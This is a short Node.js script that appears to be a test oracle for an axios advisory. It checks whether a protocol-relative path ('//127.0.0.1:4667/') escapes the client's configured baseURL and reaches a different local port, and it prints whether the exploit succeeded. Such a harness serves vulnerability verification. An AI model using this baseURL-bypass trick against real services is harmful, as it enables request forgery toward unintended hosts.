let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const marker = 'ghsa-8hc4-vh64-cxmj-oracle';
    const goodPort = 4666;
    const badPort = 4667;

    const client = axios.create({
      baseURL: 'http://127.0.0.1:' + String(goodPort)
    });

    const benign = await client.get('/health');
    if (!benign || typeof benign.data !== 'string') {
      throw new Error('benign_invalid_response');
    }

    operation_completed = true;

    try {
      const malicious = await client.get('//127.0.0.1:' + String(badPort) + '/');
      const body = malicious && typeof malicious.data === 'string' ? malicious.data : '';
      exploit_succeeded = body.trim() === 'bad';
      evidence = marker + ';malicious_status=' + (malicious && malicious.status) + ';body=' + body;
    } catch (err) {
      exploit_succeeded = false;
      evidence = marker + ';blocked=' + (err && err.message ? err.message : String(err));
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
})();